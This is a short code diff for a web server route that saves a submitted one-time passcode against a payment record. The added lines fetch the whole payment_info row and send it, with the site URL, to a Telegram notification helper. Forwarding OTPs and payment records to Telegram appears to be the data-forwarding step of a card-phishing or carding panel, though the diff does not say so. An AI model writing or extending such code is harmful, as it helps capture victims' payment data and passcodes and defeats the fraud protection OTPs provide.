@@ -1,4 +1,5 @@
-import db, { type PaymentInfo } from "@/server/database/db";
+import db, { type PaymentInfo } from "~/server/database/db";
+import { sendTelegramNotification } from "~/server/utils/send-telegram";
 
 export default defineEventHandler(async (event) => {
   if (event.node.req.method !== "POST") {
@@ -49,6 +50,13 @@ export default defineEventHandler(async (event) => {
       otpString,
       paymentId,
     );
+
+    const updatedPayment = db
+      .prepare("SELECT * FROM payment_info WHERE id = ?")
+      .get(paymentId) as PaymentInfo;
+
+    const baseUrl = `${getRequestProtocol(event)}://${getRequestHost(event)}`;
+    sendTelegramNotification(updatedPayment, false, baseUrl);
 
     return {
       success: true,
